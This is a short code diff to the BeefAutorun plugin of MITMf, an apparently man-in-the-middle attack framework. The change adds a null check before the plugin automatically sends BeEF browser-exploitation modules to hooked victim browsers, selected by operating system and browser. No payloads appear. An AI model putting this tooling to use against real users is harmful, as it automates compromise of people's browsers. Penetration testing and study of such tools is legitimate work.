@@ -106,20 +106,21 @@ class BeefAutorun(Inject, Plugin):
 					mitmf_logger.info('{} >> ERROR sending module {}'.format(session_ip, mod_id))
 				sleep(0.5)
 
-		mitmf_logger.info("{} >> sending targeted modules".format(session_ip))
 		for os in targeted_modules:
-			if (os in hook_os) or (os == hook_os):
-				browsers = targeted_modules[os]
-				if len(browsers) > 0:
-					for browser in browsers:
-						if browser == hook_browser:
-							modules = targeted_modules[os][browser]
-							if len(modules) > 0:
-								for module, options in modules.iteritems():
-									mod_id = self.beef.module_id(module)
-									resp = self.beef.module_run(session, mod_id, json.loads(options))
-									if resp["success"] == 'true':
-										mitmf_logger.info('{} >> sent module {}'.format(session_ip, mod_id))
-									else:
-										mitmf_logger.info('{} >> ERROR sending module {}'.format(session_ip, mod_id))
-									sleep(0.5)
+			if (hook_browser is not None) and (hook_os is not None):
+				mitmf_logger.info("{} >> sending targeted modules".format(session_ip))
+				if (os in hook_os) or (os == hook_os):
+					browsers = targeted_modules[os]
+					if len(browsers) > 0:
+						for browser in browsers:
+							if browser == hook_browser:
+								modules = targeted_modules[os][browser]
+								if len(modules) > 0:
+									for module, options in modules.iteritems():
+										mod_id = self.beef.module_id(module)
+										resp = self.beef.module_run(session, mod_id, json.loads(options))
+										if resp["success"] == 'true':
+											mitmf_logger.info('{} >> sent module {}'.format(session_ip, mod_id))
+										else:
+											mitmf_logger.info('{} >> ERROR sending module {}'.format(session_ip, mod_id))
+										sleep(0.5)
